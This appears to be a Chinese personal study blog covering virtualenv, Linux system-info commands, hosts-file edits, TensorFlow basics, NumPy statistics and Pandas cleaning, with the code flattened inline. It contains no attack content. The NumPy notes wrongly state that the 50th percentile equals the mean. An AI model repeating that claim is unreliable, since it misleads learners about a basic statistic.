    <content type="text"><![CDATA[2 月 10 号virtualenv通过pip安装virtualenv：pip install virtualenv测试安装:virtualenv –version为一个工程项目搭建一个虚拟环境:cd my_projectvirtualenv my_project_env选择指定一个Python解释器（比如python2.7），没有指定则由系统默认的解释器来搭建：virtualenv -p /usr/bin/python2.7 my_project_env 要开始使用虚拟环境，其需要被激活：source my_project_env/bin/activate停用虚拟环境：deactivate停用后将回到系统默认的Python解释器 12345678910111213141516171819202122232425安装和新建虚拟环境cmd下输入：前提是你的python安装路径已经被添加到环境变量中C:\&gt;pip install virtualenv新建虚拟环境：C:\&gt;virtualenv testenvUsing base prefix &apos;c:\\python36&apos;New python executable in C:\testenv\Scripts\python.exe //默认安装在当前目录下Installing setuptools, pip, wheel...done.可以在当前目录下看一下：激活和关闭当前的虚拟环境C:\testenv\Scripts&gt;activate //激活(testenv) C:\testenv\Scripts&gt; //注意终端发生了变化(testenv) C:\testenv\Scripts&gt;deactivate //关闭当前虚拟环境C:\testenv\Scripts&gt;列出当前的虚拟环境都安装了哪些包(testenv) c:\testenv\Scripts&gt;pip3 listpip (9.0.1)setuptools (37.0.0)wheel (0.30.0)现在你就可以在你创建的虚拟环境下安装需要使用到的包了 Jupyter其实应该先在Terminal里运行Jupyter Notebook 详细见 jupyter 专题总结 查看linux版本1、# uname －a （Linux查看版本当前操作系统内核信息）2、# cat /proc/version （Linux查看当前操作系统版本信息）3、# cat /etc/issue 或cat /etc/redhat-release（Linux查看版本当前操作系统发行版信息）4、# cat /proc/cpuinfo （Linux查看cpu相关信息，包括型号、主频、内核信息等）5、# getconf LONG_BIT （Linux查看版本说明当前CPU运行在32bit模式下， 但不代表CPU不支持64bit）6、# lsb_release -a Hostshosts文件的默认格式，ip地址+空格+网址，其实hosts文件完全是用来加速网址访问的，也就是网址解析部分，这样不需要连接查询DNS服务器！这样，我们只要修改掉其中的ip地址，就会连接到一个错误的ip地址，并不会连接DNS服务器查询，这样就无法访问网址了！ Linux用户 /etc/hosts文件修改后如何生效修改/etc/hosts之后正常情况应该是保存之后立即生效的，但是有时不是。使用uname -a 可以查看hostname是多少，就可以知道是否修改生效了。如果没有这时的策略有：1） 重启机器2） 重启服务 Ubuntu: $sudo /etc/init.d/networking restart Gentoo: /etc/init.d/net.eth0 restart3）使用hostname命令 hostname 定义的主机名 tensorflow123import timeprint(time.ctime())print(&apos;hello Jupyter!&apos;) 2 月 12 至 13 号优化了一个python小工具Python文本文件的输入输出操作学习创建文件对象我们打开一个文件，并使用一个对象来表示该文件： f = open(文件名，模式) 最常用的模式有： “r” # 只读 “w” # 写入 比如 f = open(“test.txt”,”r”) 文件对象的方法读取： content = f.read(N) # 读取N bytes的数据 content = f.readline() # 读取一行 content = f.readlines() # 读取所有行，储存在列表中，每个元素是一行。 写入： f.write(‘I like apple’) # 将’I like apple’写入文件 关闭文件： f.close() #coding=utf-8 import os #获取目标文件夹的路径 filedir = os.getcwd()+'/yuliao' #获取当前文件夹中的文件名称列表 filenames=os.listdir(filedir) #打开当前目录下的result.txt文件，如果没有则创建 f=open('result.txt','w') #先遍历文件名 for filename in filenames: filepath = filedir+'/'+filename #遍历单个文件，读取行数 for line in open(filepath): f.writelines(line) // f.write('\n') #关闭文件 f.close() ‘replace替换函数的使用’ 2 月 12 至 14 号 Tnesorflow张量张量有两个重要属性：1.数据类型（如浮点型、整型、字符串）2.数组形状（各个维度的大小） TensorFlow 张量是什么？1、张量是用来表示多维数据的2、张量是执行操作时的输入或输出数据。3、用户通过执行操作来创建或计算张量。4、张量的形状不一定在编译时确定，可以在运行时通过形状推断计算得出。 几类比较特别的张量1、tf.constant//常量2、tf.placeholder//占位符3、tf.Variable//变量 变量变量（Variab1e）的主要作用维护特定节点的状态，如深度学习或机器学习的模型参数。tf.Variable 方法是操作，返回值是变量（特殊张量）。 变量与张量有什么不同张量的生命周期通常随依赖的计算完成而结束，内存也随即释放。变量则常驻内存，在每一步训练时不断更新其值，以实现模型参数的更新。 什么是阶定义了张量所能买描述的最大的维度。维度值：123linear_squares = tf.Variable([[4], [9], [16], [25]], tf.int32)&lt;tf.Variable &apos;Variable_10:0&apos; shape=(4, 1) dtype=int32_ref&gt;,第一阶维度值为4，第二阶维度值是1。 tf.rank 获取张量的阶数tf.zeros 把任何一个数组进行初始化。 返回值为张量 tf.Tensor 会像jvm一样进行内存回收但是 tf.Variable 会一直存留（维护状态），可用来保存某参数。 TensorFlow 变量使用流程 checkpoint 文件：整个训练过程中如果需要对其训练参数进行调整，可以用 saver 函数进行保存、恢复。 部分函数 tf.random_normal：方法返回形状为(1，4)的张量。它的4个元素符合均值为100、标准差为0.35的正态分布。 123456789101112131415def random_normal(shape, mean=0.0, stddev=1.0, dtype=dtypes.float32, seed=None, name=None):从正态分布输出随机值。 Args：shape：一维整数Tensor或Python数组。输出张量的形状。 mean：类型为`dtype`的0-D Tensor或Python值。正态分布的均值。 stddev：类型为`dtype`的0-D Tensor或Python值。正态分布的标准差。 dtype：输出的类型。 seed：Python整数。用于为分发创建随机种子。 请参阅`tf.set_random_seed`了解行为。 name：操作的名称（可选）。 返回：指定形状的张量，填充随机正常值。 global_variables_initializer ：方法初始化全局变量 def assign_add(ref, value, use_locking=None, name=None):通过向其添加“值”来更新“ref”。更新完成后，此操作输出“ref”。 train.Saverdef init (self, var_list=None, reshape=False, sharded=False, max_to_keep=5, keep_checkpoint_every_n_hours=10000.0, name=None, restore_sequentially=False, saver_def=None, builder=None, defer_build=False, allow_empty=False, write_version=saver_pb2.SaverDef.V2, pad_step_number=False, save_relative_paths=False, filename=None): def save(self, sess, save_path, global_step=None, latest_filename=None, meta_graph_suffix=&quot;meta&quot;, write_meta_graph=True, write_state=True, strip_default_attrs=False): def restore(self, sess, save_path): 123456789# 创建Saversaver = tf.train.Saver(&#123;&apos;W&apos;: W, &apos;b&apos;: b&#125;)# 存储变量到文件 &apos;./summary/test.ckpt-0&apos;saver.save(sess, &apos;./summary/test.ckpt&apos;, global_step=0)# 从文件中恢复变量 b 的值saver.restore(sess, &apos;./summary/test.ckpt-0&apos;)# 查看变量 b 是否恢复成功sess.run(b) 操作TensorFlow 用数据流图表示算法模型。数据流图由节点和有向边组成，每个节点均对应一个具体的操作。因此，操作是模型功能的实际载体。 数据流图中的节点按照功能不同可以分为3种：存储节点：有状态的变量操作，通常用来存储模型参数；计算节点：无状态的计算或控制操作，主要负责算法逻辑表达或流程控制；数据节点：数据的占位符操作，用于描述图外输入数据的属性。 TensorFlow典型计算和控制操作 TensorFlow 占位符操作 def placeholder(dtype, shape=None, name=None): 1234# 占位符操作# x = tf.placeholder(dtype, shape, name)x = tf.placeholder(tf.int16, shape=(), name=&quot;x&quot;)y = tf.placeholder(tf.int16, shape=(), name=&quot;y&quot;) TensorFlow 使用占位符操作表示图外输入的数据，如训练和测试数据。TensorFlow 数据流图描述了算法模型的计算拓扑，其中的各个操作（节点）都是抽象的函数映射或数学表达式。 12345# 加载默认数据流图with tf.Session() as sess: # 不填充数据，直接执行操作，报错 print(&quot;Addition with variables: %i&quot; % sess.run(add, feed_dict=&#123;x: 10, y: 5&#125;)) print(&quot;Multiplication with variables: %i&quot; % sess.run(mul, feed_dict=&#123;x: 2, y: 3&#125;)) 会话会话提供了估算张量和执行操作的运行环境，它是发放计算任务的客户端，所有计算任务都由它连接的执行引擎完成。 一个会话的典型使用流程分为以下3步： 会话执行获取张量值的另外两种方法:估算张量（Tensor.eval）与执行操作（Operation.run） 12345678910import tensorflow as tf# 创建数据流图：y = W * x + b，其中W和b为存储节点，x为数据节点。x = tf.placeholder(tf.float32)W = tf.Variable(1.0)b = tf.Variable(1.0)y = W * x + bwith tf.Session() as sess: tf.global_variables_initializer().run() # Operation.run fetch = y.eval(feed_dict=&#123;x: 3.0&#125;) # Tensor.eval print(fetch) # fetch = 1.0 * 3.0 + 1.0 会话执行原理当我们调用sess.run（train_op）语句执行训练操作时： 首先，程序内部提取操作依赖的所有前置操作。这些操作的节点共同组成一幅子图。 然后，程序会将子图中的计算节点、存储节点和数据节点按照各自的执行设备分类，相同设备上的节点组成了一幅局部图。·最后，每个设备上的局部图在实际执行时，根据节点间的依赖关系将各个节点有序地加载到设备上执行。 会话执行步骤 会话本地执行对于单机程序来说，相同机器上不同编号的CPU或GPU就是不同的设备，我们可以在创建节点时指定执行该节点的设备。 123#在0号CPU执行的存储节点with tf.device（&quot;/cpu：0&quot;）：v=tf.Variable（...） 123#在0号GPU执行的计算节点with tf.device（&quot;/gpu：0&quot;）：z=tf.matmul（x，y） 优化器（Optimizer）优化器是实现优化算法的载体。 一次典型的迭代优化应该分为以下3个步骤：1.计算梯度：调用compute_gradients方法；2.处理梯度：用户按照自己需求处理梯度值，如梯度裁剪和梯度加权等；3.应用梯度：调用apply_gradients方法，将处理后的梯度值应用到模型参数。 123456789101112#1.计算梯度optimizer=tf.train.GradientDescentoptimizer（learning_rate=0.01）## 定义一个优化器 学习率0.01grads_and_vars=optimizer.compute_gradients（loss，var_list，..…）## 用XX方法获取梯度值 输入损失函数、变量列表#2.处理梯度cLip_grads_and_vars=[（tf.clip_by_value（grad，-1.0，1.0），var）for grad，var in grads_and_varsl## 用 XX 方法处理梯度值#3.应用梯度train_op=optimizer.apply_gradients（clip_grads_and_vars）## 把处理好的梯度以及对应的变量进行更新得到新的模型 12345#计算并应用梯度到模型参数optimizer=tf.train.GradientDescentOptimizer（learning_rate=0.01）global_step=tf.Variable（0，name=&apos;global_step&apos;，trainable=False）train_op=optimizer.minimize（loss，global_step=global_step）## 不需要对梯度值进行优化处理的情况直接 minmize 内置优化器 损失函数损失函数是评估特定模型参数和特定输入时，表达模型输出的推理值与真实值之间不一致程度的函数。常见的损失函数有平方损失函数、交叉熵损失函数和指数损失函数使用损失函数对所有训练样本求损失值，再累加求平均可得到模型的经验风险。换句话说，f（x）关于训练集的平均损失就是经验风险 过拟合问题然而，如果过度地追求训练数据上的低损失值，就会遇到过拟合问题。训练集通常并不能完全代表真实场景的数据分布。当两者的分布不一致时，如果过分依赖训练集上的数据，面对新数据时就会无所适从，这时模型的泛化能力就会变差。 ps：就是说我们通过现有的数据进行训练，但是可能将这个误差减少的非常少，但是实际的值并不一定符合样本数据，过分拟合会导致接收到真实值后预测值反而误差很大（接收的值偏离样本分布规律）。 为了降低过度训练可能造成的过拟合风险可以引入专门用来度量模型复杂度的正则化项（regularizer）或惩罚项（penalty term）-J（f）。常用的正则化项有L0、L1和L2范数。因此，我们将模型最优化的目标替换为鲁棒性更好的结构风险最小化（structural risk minimization，SRM）。 在模型训练过程中，结构风险不断地降低。当小于我们设置的损失值阈值时，则认为此时的模型已经满足需求。因此，模型训练的本质就是在最小化结构风险的同时取得最优的模型参数。 优化算法典型的机器学习和深度学习问题通常都需要转换为最优化问题进行求解。 通常采用迭代方式实现：首先设定一个初始的可行解，然后基于特定的函数反复重新计算可行解，直到找到一个最优解或达到预设的收敛条件。 不同的优化算法采用的迭代策略各有不同： 有的使用目标函数的一阶导数，如梯度下降法； 有的使用目标函数的二阶导数，如牛顿法；·有的使用前几轮迭代的信息，如Adam。 基于梯度下降法的迭代策略最简单，它直接沿着梯度负方向，即 目标函数减小最快 的方向进行直线搜索。其计算表达式如下： 2 月 15 至17 号 Tensorflowpython基础列表1234567lists = [&apos;a&apos;,&apos;b&apos;,&apos;c&apos;]lists.append(&apos;d&apos;)print listsprint len(lists)lists.insert(0,&apos;mm&apos;)lists.pop()print lists 列表是 Python 中常用的数据结构，相当于数组，具有增删改查的功能，我们可以使用 len() 函数获得 lists 中元素的个数；使用 append() 在尾部添加元素，使用 insert() 在列表中插入元素，使用 pop() 删除尾部的元素。 元组12tuples = (&apos;tupleA&apos;,&apos;tupleB&apos;)print (tuples[0]) 元组 tuple 和 list 非常类似，但是 tuple 一旦初始化就不能修改。因为不能修改所以没有 append(), insert() 这样的方法，可以像访问数组一样进行访问，比如 tuples[0]，但不能赋值。 字典1234567891011121314# 定义一个 dictionaryfrom typing import Dictscore: Dict[str, int] = &#123;&apos;guanyu&apos;:95,&apos;zhangfei&apos;:96&#125;# 添加一个元素score[&apos;zhaoyun&apos;] = 98print (score)# 删除一个元素score.pop(&apos;zhangfei&apos;)# 查看 key 是否存在print (&apos;guanyu&apos; in score)# 查看一个 key 对应的值print (score.get(&apos;guanyu&apos;))print (score.get(&apos;yase&apos;,99)) 字典其实就是{key, value}，多次对同一个 key 放入 value，后面的值会把前面的值冲掉，同样字典也有增删改查。增加字典的元素相当于赋值，比如 score[‘zhaoyun’] = 98，删除一个元素使用 pop，查询使用 get，如果查询的值不存在，我们也可以给一个默认值，比如 score.get(‘yase’,99)。 集合12345s = set([&apos;a&apos;, &apos;b&apos;, &apos;c&apos;])s.add(&apos;d&apos;)s.remove(&apos;b&apos;)print sprint &apos;c&apos; in s 集合 set 和字典 dictory 类似，不过它只是 key 的集合，不存储 value。同样可以增删查，增加使用 add，删除使用 remove，查询看某个元素是否在这个集合里，使用 in。 ps:思考为什么 jupyter 与 pycharm 集合输出结果顺序不同？集合。。没顺序。。。 NumPy标准的 Python 中，用列表 list 保存数组的数值。由于列表中的元素可以是任意的对象，所以列表中 list 保存的是对象的指针。虽然在 Python 编程中隐去了指针的概念，但是数组有指针，Python 的列表 list 其实就是数组。这样如果我要保存一个简单的数组 [0,1,2]，就需要有 3 个指针和 3 个整数的对象，这样对于 Python 来说是非常不经济的，浪费了内存和计算时间。 为什么要用 NumPy 数组结构而不是 Python 本身的列表 list？这是因为列表 list 的元素在系统内存中是分散存储的，而 NumPy 数组存储在一个均匀连续的内存块中。这样数组计算遍历所有的元素，不像列表 list 还需要对内存地址进行查找，从而节省了计算资源。 缓存会直接把字节块从 RAM 加载到 CPU 寄存器中。因为数据连续的存储在内存中，NumPy 直接利用现代 CPU 的矢量化指令计算，加载寄存器中的多个连续浮点数。另外 NumPy 中的矩阵计算可以采用多线程的方式，充分利用多核 CPU 计算资源，大大提升了计算效率。 在 NumPy 里有两个重要的对象：ndarray（N-dimensional array object）解决了多维数组问题，而 ufunc（universal function object）则是解决对数组进行处理的函数。 ndarray 对象12345678import numpy as npa = np.array([1, 2, 3])b = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]])b[1,1]=10print(a.shape)print(b.shape)print(a.dtype)print(b) 通过函数 shape 属性获得数组的大小，通过 dtype 获得元素的属性。如果你想对数组里的数值进行修改的话，直接赋值即可,下标应该是 [1,1]=10。 迷之结构数组123456789101112131415import numpy as nppersontype = np.dtype(&#123; &apos;names&apos;:[&apos;name&apos;, &apos;age&apos;, &apos;chinese&apos;, &apos;math&apos;, &apos;english&apos;], &apos;formats&apos;:[&apos;S32&apos;,&apos;i&apos;, &apos;i&apos;, &apos;i&apos;, &apos;f&apos;]&#125;)peoples = np.array([(&quot;ZhangFei&quot;,32,75,100, 90),(&quot;GuanYu&quot;,24,85,96,88.5), (&quot;ZhaoYun&quot;,28,85,92,96.5),(&quot;HuangZhong&quot;,29,65,85,100)], dtype=persontype)ages = peoples[:][&apos;age&apos;]chineses = peoples[:][&apos;chinese&apos;]maths = peoples[:][&apos;math&apos;]englishs = peoples[:][&apos;english&apos;]print(np.mean(ages))print(np.mean(chineses))print(np.mean(maths))print(np.mean(englishs)) 首先在 NumPy 中是用 dtype 定义的结构类型，然后在定义数组的时候，用 array 中指定了结构数组的类型 dtype=persontype，这样你就可以自由地使用自定义的 persontype 了。 函数解释123456def mean(a, axis=None, dtype=None, out=None, keepdims=np._NoValue):求平均值。axis：无或 int 或 int 的元组，可选的Axis或计算均值的轴。默认设置是计算展平数组的平均值。**迷茫**out：Alternate 输出数组，用于放置结果。默认为“无”。如果提供，它必须具有与预期输出相同的形状，但必要时将转换类型。keepdims：bool，optional 如果将此值设置为True，则缩小的轴将作为尺寸为1的尺寸保留在结果中。使用此选项，结果将针对输入数组正确广播。如果传递了默认值，那么`keepdims`将不会传递给`ndarray`的子类的`mean`方法，但是任何非默认值都将是。如果子类&apos;方法没有实现`keepdims`，则会引发任何异常。 ufunc 运算1234567891011x1 = np.arange(1,11,2)x2 = np.linspace(1,9,5)print np.add(x1, x2)print np.subtract(x1, x2)print np.multiply(x1, x2)print np.divide(x1, x2)print np.power(x1, x2)print np.remainder(x1, x2)这两个数组的结果 x1,x2 都是 [1 3 5 7 9]。加、减、乘、除、求 n 次方和取余数。 函数解释12345def linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None, axis=0):从 start 开始 到 stop 结束取 50 个值，相邻间隔相同endpoint:输出值是否将stop的值包含进去retpoint:是否将相邻两个书的间隔显示出来 12def arange(start=None, *args, **kwargs): 开始、停止、间隔 for（i，&lt;,） 统计函数12345678import numpy as npa = np.array([[1,2,3], [4,5,6], [7,8,9]])print(np.amin(a))print(np.amin(a,0))print(np.amin(a,1))print(np.amax(a))print(np.amax(a,0))print(np.amax(a,1)) amin() 用于计算数组中的元素沿指定轴的最小值。对于一个二维数组 a，amin(a) 指的是数组中全部元素的最小值，amin(a,0) 是延着 axis=0 轴的最小值，axis=0 轴是把元素看成了 [1,4,7], [2,5,8], [3,6,9] 三个元素，所以最小值为 [1,2,3]，amin(a,1) 是延着 axis=1 轴的最小值，axis=1 轴是把元素看成了 [1,2,3], [4,5,6], [7,8,9] 三个元素，所以最小值为 [1,4,7]。同理 amax() 是计算数组中元素沿指定轴的最大值。 函数解释123456789101112131415161718192021222324def amin(a, axis=None, out=None, keepdims=np._NoValue, initial=np._NoValue):def amax(a, axis=None, out=None, keepdims=np._NoValue, initial=np._NoValue):返回最大最小axis：无或int或int的元组，可选轴或沿其运行的轴。默认情况下，使用展平输入。 .. versionadded :: 1.7.0如果这是一个整数元组，则在多个轴上选择最大值，而不是像以前那样选择单个轴或所有轴。out：替代输出数组，用于放置结果。必须与预期输出具有相同的形状和缓冲长度。initial：标量，可选输出元素的最小值。必须存在以允许在空切片上进行计算。有关详细信息。keepdims：同 mean 函数eg:a = np.arange(4).reshape((2,2))print(a)print(np.amax(a) ) # Maximum of the flattened array)print(np.amax(a, axis=0) ) # Maxima along the first axis)print(np.amax(a, axis=1) )# Maxima along the second axis)out:[[0 1] [2 3]]3[2 3][1 3] 12def reshape(self, shape, order=&apos;C&apos;):返回包含具有新形状的相同数据的数组。 统计最大值与最小值之差 ptp()1234a = np.array([[1,2,3], [4,5,6], [7,8,9]])print(np.ptp(a))print(np.ptp(a,0))print(np.ptp(a,1)) 对于相同的数组 a，np.ptp(a) 可以统计数组中最大值与最小值的差，即 9-1=8。同样 ptp(a,0) 统计的是沿着 axis=0 轴的最大值与最小值之差，即 7-1=6（当然 8-2=6,9-3=6，第三行减去第一行的 ptp 差均为 6），ptp(a,1) 统计的是沿着 axis=1 轴的最大值与最小值之差，即 3-1=2（当然 6-4=2, 9-7=2，即第三列与第一列的 ptp 差均为 2）。 函数解释12def ptp(a, axis=None, out=None, keepdims=np._NoValue):同mean 统计数组的百分位数 percentile()1234a = np.array([[1,2,3], [4,5,6], [7,8,9]])print(np.percentile(a, 50))print(np.percentile(a, 50, axis=0))print(np.percentile(a, 50, axis=1)) percentile() 代表着第 p 个百分位数，这里 p 的取值范围是 0-100，如果 p=0，那么就是求最小值，如果 p=50 就是求平均值，如果 p=100 就是求最大值。同样你也可以求得在 axis=0 和 axis=1 两个轴上的 p% 的百分位数。 函数解释12345678910111213141516171819202122232425262728293031323334def percentile(a, q, axis=None, out=None, overwrite_input=False, interpolation=&apos;linear&apos;, keepdims=False):keepdims:如果将此值设置为True，则缩小的轴将作为尺寸为1的尺寸保留在结果中。使用此选项，结果将正确地对原始数组“a”进行广播。overwrite:允许通过中间计算修改输入数组`a`，以节省内存。在这种情况下，此函数完成后输入“a”的内容未定义。out：可选的替代输出数组，用于放置结果。它必须具有与预期输出相同的形状和缓冲区长度，但必要时将转换类型（输出）。interpolation : &#123;&apos;linear&apos;, &apos;lower&apos;, &apos;higher&apos;, &apos;midpoint&apos;, &apos;nearest&apos;&#125; 迷茫eg:a = np.array([[10, 7, 4], [3, 2, 1]])print(a)print(np.percentile(a, 50))print(np.percentile(a, 50, axis=0))print(np.percentile(a, 50, axis=1))print( np.percentile(a, 50, axis=1, keepdims=True))m = np.percentile(a, 50, axis=0)out = np.zeros_like(m)print(np.percentile(a, 50, axis=0, out=out))print(m)b = a.copy()print(np.percentile(b, 50, axis=1, overwrite_input=True))# assert not np.all(a == b)out：[[10 7 4] [ 3 2 1]]3.5[6.5 4.5 2.5][7. 2.][[7.] [2.]][6.5 4.5 2.5][6.5 4.5 2.5][7. 2.] 12def zeros_like(a, dtype=None, order=&apos;K&apos;, subok=True):返回与给定数组具有相同形状和类型的零数组。就是初始化赋值0. 统计数组中的中位数 median()、平均数 mean()123456789a = np.array([[1,2,3], [4,5,6], [7,8,9]])# 求中位数print(np.median(a))print(np.median(a, axis=0))print(np.median(a, axis=1))# 求平均数print(np.mean(a))print(np.mean(a, axis=0))print(np.mean(a, axis=1)) 函数说明1def median(a, axis=None, out=None, overwrite_input=False, keepdims=False): 统计数组中的加权平均值 average()1234a = np.array([1,2,3,4])wts = np.array([1,2,3,4])print(np.average(a))print(np.average(a,weights=wts)) average() 函数可以求加权平均，加权平均的意思就是每个元素可以设置个权重，默认情况下每个元素的权重是相同的，所以 np.average(a)=(1+2+3+4)/4=2.5，你也可以指定权重数组 wts=[1,2,3,4]，这样加权平均 np.average(a,weights=wts)=(11+22+33+44)/(1+2+3+4)=3.0。 函数说明1234567891011121314151617181920212223def average(a, axis=None, weights=None, returned=False):weights：权重；与“a”中的值相关联的权重数组。 “a”中的每个值根据其相关权重对平均值做出贡献。 权重数组可以是1-D（在这种情况下，其长度必须是沿给定轴的“a”的大小）或者与“a”形状相同。 如果`weights = None`，则假定“a”中的所有数据的权重等于1。returned: 默认为“False”。如果为“True”，则返回元组（“average”，“sum_of_weights”），否则仅返回平均值。 如果`weights = None`，`sum_of_weights`等于获取平均值的元素数。eg:data = np.arange(1,5)print(np.average(data))print(np.average(range(1,11), weights=range(10,0,-1),returned = True))#迷data2 = np.arange(6).reshape((3,2))print(data2)out：2.5(4.0, 55.0)[[0 1] [2 3] [4 5]] 统计数组中的标准差 std()、方差 var()123a = np.array([1,2,3,4])print(np.std(a))print(np.var(a)) 方差的计算是指每个数值与平均值之差的平方求和的平均值，即 mean((x - x.mean())** 2)。标准差是方差的算术平方根。在数学意义上，代表的是一组数据离平均值的分散程度。所以 np.var(a)=1.25, np.std(a)=1.118033988749895。 函数说明123456def std(a, axis=None, dtype=None, out=None, ddof=0, keepdims=np._NoValue):标准差。ddof：意味着三角自由度。计算中使用的除数是“N - ddof”，其中“N”表示元素的数量。 默认情况下，`ddof`为零。 迷keepdims：如果将其设置为True，则缩小的轴将作为尺寸为1的尺寸保留在结果中。使用此选项，结果将针对输入数组正确广播。 如果传递了默认值，那么`keepdims`将不会传递给`ndarray`的子类的`std`方法，但是任何非默认值都将是。如果子类&apos;方法没有实现`keepdims`，则会引发任何异常。 123def var(a, axis=None, dtype=None, out=None, ddof=0, keepdims=np._NoValue):方差；同上。 NumPy 排序12345a = np.array([[4,3,2],[2,4,1]])print(np.sort(a))print(np.sort(a, axis=None))print(np.sort(a, axis=0) )print(np.sort(a, axis=1) ) 那么这些排序算法在 NumPy 中实现起来其实非常简单，一条语句就可以搞定。这里你可以使用 sort 函数，sort(a, axis=-1, kind=‘quicksort’, order=None)，默认情况下使用的是快速排序；在 kind 里，可以指定 quicksort、mergesort、heapsort 分别表示快速排序、合并排序、堆排序。同样 axis 默认是 -1，即沿着数组的最后一个轴进行排序，也可以取不同的 axis 轴，或者 axis=None 代表采用扁平化的方式作为一个向量进行排序。另外 order 字段，对于结构化的数组可以指定按照某个字段进行排序。 函数说明1234def sort(a, axis=-1, kind=&apos;quicksort&apos;, order=None):kind : &#123;&apos;quicksort&apos;, &apos;mergesort&apos;, &apos;heapsort&apos;, &apos;stable&apos;&#125;, optional Sorting algorithm. Default is &apos;quicksort&apos;.order : str或str的列表，可选当`a`是一个定义了字段的数组时，此参数指定要比较哪些字段的第一个，第二个等。可以将单个字段指定为字符串，而不是所有字段都需要指定，但是仍然会按照它们出现在dtype中的顺序使用未指定的字段来打破关系。 迷 Pandas数据结构：Series 和 DataFrameSeries 是个定长的字典序列。说是定长是因为在存储的时候，相当于两个 ndarray，这也是和字典结构最大的不同。因为在字典的结构里，元素的个数是不固定的。 1234567891011121314在 Series 结构中，index 默认是 0,1,2,……递增的整数序列，当然我们也可以自己来指定索引，比如 index=[‘a’, ‘b’, ‘c’, ‘d’]。import pandas as pdfrom pandas import Series, DataFramex1 = Series([1,2,3,4])x2 = Series(data=[1,2,3,4], index=[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;])print(x1)print(x2)也可以采用字典的方式来创建 Seriesd = &#123;&apos;a&apos;:1, &apos;b&apos;:2, &apos;c&apos;:3, &apos;d&apos;:4&#125;x3 = Series(d)print x3 DataFrame 类型数据结构类似数据库表它包括了行索引和列索引，我们可以将 DataFrame 看成是由相同索引的 Series 组成的字典类型。 DataFrame 类型数据结构类似数据库表。数据导入和输出数据清洗123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657581、 删除 DataFrame 中的不必要的列或行df2 = df2.drop(columns=[&apos;Chinese&apos;])df2 = df2.drop(index=[&apos;ZhangFei&apos;]) def drop(self, labels=None, axis=0, index=None, columns=None, level=None, inplace=False, errors=&apos;raise&apos;):level : int or level name, optional For MultiIndex, level from which the labels will be removed.inplace : bool, default False If True, do operation inplace and return None.errors : &#123;&apos;ignore&apos;, &apos;raise&apos;&#125;, default &apos;raise&apos; If &apos;ignore&apos;, suppress error and only existing labels are dropped.2. 重命名列名 columns，让列表名更容易识别 def rename(self, *args, **kwargs):3. 去重复的值def drop_duplicates(self, keep=&apos;first&apos;, inplace=False):keep：&#123;&apos;first&apos;，&apos;last&apos;，``False``&#125;，默认&apos;first&apos; - &apos;first&apos;：删除第一次出现的重复项。 - &apos;last&apos;：删除重复项，最后一次出现除外。 - ``False``：删除所有重复项。inplace：boolean，默认``False``如果``True``，则执行inplace操作并返回None。4. 格式问题 更改数据格式 df2[&apos;Chinese&apos;].astype(&apos;str&apos;) df2[&apos;Chinese&apos;].astype(np.int64) 数据间的空格 # 删除左右两边空格 df2[&apos;Chinese&apos;]=df2[&apos;Chinese&apos;].map(str.strip) # 删除左边空格 df2[&apos;Chinese&apos;]=df2[&apos;Chinese&apos;].map(str.lstrip) # 删除右边空格 df2[&apos;Chinese&apos;]=df2[&apos;Chinese&apos;].map(str.rstrip) # 删除美元符号 df2[&apos;Chinese&apos;]=df2[&apos;Chinese&apos;].str.strip(&apos;$&apos;) 大小写转换 # 全部大写 df2.columns = df2.columns.str.upper() # 全部小写 df2.columns = df2.columns.str.lower() # 首字母大写 df2.columns = df2.columns.str.title() 查找空值 .isnull() .isnull().any() 使用 apply 函数对数据进行清洗123大写转化df[&apos;name&apos;] = df[&apos;name&apos;].apply(str.upper) 数据统计 数据表合并12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667681. 基于指定列进行连接 df3 = pd.merge(df1, df2, on=&apos;name&apos;)2. inner 内连接 df3 = pd.merge(df1, df2, how=&apos;inner&apos;)3. left 左连接 df3 = pd.merge(df1, df2, how=&apos;left&apos;)4. right 右连接 df3 = pd.merge(df1, df2, how=&apos;right&apos;)5. outer 外连接 df3 = pd.merge(df1, df2, how=&apos;outer&apos;)def merge(left, right, how=&apos;inner&apos;, on=None, left_on=None, right_on=None, left_index=False, right_index=False, sort=False, suffixes=(&apos;_x&apos;, &apos;_y&apos;), copy=True, indicator=False, validate=None): left : DataFrame right : DataFrame on : label or list Field names to join on. Must be found in both DataFrames. left_on : label or list, or array-like Field names to join on in left DataFrame. Can be a vector or list of vectors of the length of the DataFrame to use a particular vector as the join key instead of columns right_on : label or list, or array-like Field names to join on in right DataFrame or vector/list of vectors per left_on docs left_by : column name or list of column names Group left DataFrame by group columns and merge piece by piece with right DataFrame right_by : column name or list of column names Group right DataFrame by group columns and merge piece by piece with left DataFrame fill_method : &#123;&apos;ffill&apos;, None&#125;, default None Interpolation method for data suffixes : 2-length sequence (tuple, list, ...) Suffix to apply to overlapping column names in the left and right side, respectively how : &#123;&apos;left&apos;, &apos;right&apos;, &apos;outer&apos;, &apos;inner&apos;&#125;, default &apos;outer&apos; * left: use only keys from left frame (SQL: left outer join) * right: use only keys from right frame (SQL: right outer join) * outer: use union of keys from both frames (SQL: full outer join) * inner: use intersection of keys from both frames (SQL: inner join)left：DataFrame right：DataFrame on：label或list要加入的字段名称。必须在两个DataFrame中都能找到。left_on：标签或列表，或类似于数组的字段名称，用于在左侧DataFrame中连接。可以是DataFrame长度的向量或向量列表，使用特定向量作为连接键而不是列right_on：label或list，或类似于数组的字段名称，用于在右侧DataFrame或向量/向量列表中连接per_ left docs left_by：列名称或列名列表按组列分组左DataFrame并使用右DataFrame右键合并right_by：列名称或列名列表按组列分组右DataFrame并与左DataFrame fill_method逐段合并：&#123;&apos;ffill&apos;，None&#125;，默认无数据后缀的插值方法：2长度序列（元组，列表，...）后缀应用于左侧和右侧的重叠列名称，分别如何：&#123;&apos;left &apos;，&apos;right&apos;，&apos;outer&apos;，&apos;inner&apos;&#125;，默认&apos;outer&apos;* left：仅使用左框架中的键（SQL：left outer join）* right：仅使用来自rig的键ht frame（SQL：右外连接）* outer：使用来自两个帧的键的并集（SQL：全外连接）* inner：使用来自两个帧的键的交集（SQL：内连接） 用 SQL 方式打开 Pandaspandasql 工具包 1234567891011121314import pandas as pdfrom pandas import DataFramefrom pandasql import sqldf, load_meat, load_birthsdf1 = DataFrame(&#123;&apos;name&apos;:[&apos;ZhangFei&apos;, 